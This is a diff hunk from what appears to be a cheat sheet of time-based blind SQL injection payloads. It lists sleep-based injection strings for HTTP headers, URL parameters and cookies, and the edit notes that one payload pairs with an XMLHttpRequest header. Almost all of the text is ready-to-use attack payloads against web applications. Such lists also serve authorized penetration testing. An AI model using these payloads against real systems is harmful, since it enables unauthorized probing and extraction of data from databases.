@@ -12,7 +12,7 @@ X-Forwarded-For: "' or sleep(30)='" >> For any type of HTTP headers
 
 &topsort=flowers or sleep(3) >> Url Parameter
 
-/etc/example?term=')+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))x)+AND+(1=' >> Url Parameter
+/etc/example?term=')+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))x)+AND+(1=' >> Url Parameter with (X-Requested-With: XMLHttpRequest) header.
 
 &location=(select*from(select(sleep(3)))a) >> Cookie
 
